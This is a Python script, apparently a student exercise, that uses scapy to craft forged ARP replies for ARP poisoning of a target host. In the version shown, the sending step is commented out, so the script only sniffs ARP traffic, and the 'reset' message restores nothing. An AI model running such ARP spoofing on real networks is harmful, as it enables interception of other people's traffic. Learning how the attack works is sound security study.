#!/usr/bin/python3

# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    inquisitor.py                                      :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: sleleu <sleleu@student.42.fr>              +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/09/25 14:22:24 by sleleu            #+#    #+#              #
#    Updated: 2023/09/25 14:23:13 by sleleu           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from scapy.all import ARP, Ether, sendp, sniff
import argparse
import sys

ARP_TYPE = 0x0806
IP_SRC = ""
MAC_SRC = ""
IP_TARGET = ""
MAC_TARGET = ""

# >>> ls(Ether)
# dst        : DestMACField         = (None)
# src        : SourceMACField       = (None)
# type       : XShortEnumField      = (0)
# >>> ls(ARP)
# hwtype     : XShortField          = (1)
# ptype      : XShortEnumField      = (2048)
# hwlen      : ByteField            = (6)
# plen       : ByteField            = (4)
# op         : ShortEnumField       = (1)
# hwsrc      : ARPSourceMACField    = (None)
# psrc       : SourceIPField        = (None)
# hwdst      : MACField             = ('00:00:00:00:00:00')
# pdst       : IPField              = ('0.0.0.0')

def parse_arguments():
	parser = argparse.ArgumentParser(description="inquisitor can perform an ARP poisoning")
	parser.add_argument("IP_src", metavar="<IP-src>", help="Define the sender IP address")
	parser.add_argument("MAC_src", metavar="<MAC-src>", help="Define the sender MAC address")
	parser.add_argument("IP_target", metavar="<IP-target>", help="Define the target IP address")
	parser.add_argument("MAC_target", metavar="<MAC-target>",help="Define the target MAC address")
	return parser.parse_args()

def create_arppkt():
	trame = Ether()
	trame.type = ARP_TYPE

	packet = ARP()
	packet.hwlen = 6
	packet.plen = 4
	packet.op = 2
	try:
		packet.hwsrc = MAC_SRC
		packet.psrc = IP_SRC
		packet.hwdst = MAC_TARGET
		packet.pdst = IP_TARGET
	except OSError as error:
		print(f"inquisitor.py: error: {error}")
		exit(1)
	arppckt = trame / packet
	return arppckt

def send_packet(arppkt):
	while True:
		try:
			sendp(arppkt, verbose=False)
		except PermissionError as error:
			print(f"inquisitor.py: error: {error}")
			exit(1)
		except KeyboardInterrupt:
			print(f"Reset arp table")
			return

def check_packet(packet):
	print(packet)
	if packet.psrc == IP_TARGET:
		print("it's target!")

def inquisitor():
	sniff(filter="arp", prn=check_packet)
	# arppkt = create_arppkt()
	# arppkt.show()
	# send_packet(arppkt)

if __name__ == "__main__":
	args = parse_arguments()
	if len(sys.argv) != 5:
		exit(1)
	IP_SRC = args.IP_src
	MAC_SRC = args.MAC_src
	IP_TARGET = args.IP_target
	MAC_TARGET = args.MAC_target
	inquisitor()